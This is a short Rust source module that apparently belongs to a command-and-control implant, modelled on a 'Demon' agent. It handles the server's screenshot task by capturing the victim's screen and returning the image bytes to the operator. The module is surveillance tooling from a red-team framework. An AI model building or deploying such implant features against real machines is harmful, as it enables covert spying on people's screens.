//! Screenshot capture handler.

use red_cell_common::demon::DemonCommand;

use super::{DispatchResult, Response, write_bytes_le, write_u32_le};

// ─── COMMAND_SCREENSHOT (2510) ──────────────────────────────────────────────

/// Handle a `CommandScreenshot` task: capture the screen and return BMP bytes.
///
/// The screenshot command takes no arguments from the server.
///
/// Outgoing payload (LE): `[success: u32][image_len: u32][image_bytes…]`
///
/// On success, `success = 1` and `image_bytes` contains a 24-bit BMP file.
/// On failure (unsupported platform or GDI error), `success = 0`.
pub(super) fn handle_screenshot() -> DispatchResult {
    let bmp = crate::platform::capture_screenshot();
    let mut out = Vec::new();
    match bmp {
        Some(data) if !data.is_empty() => {
            write_u32_le(&mut out, 1); // success
            write_bytes_le(&mut out, &data);
        }
        _ => {
            write_u32_le(&mut out, 0); // failure
        }
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandScreenshot, out))
}
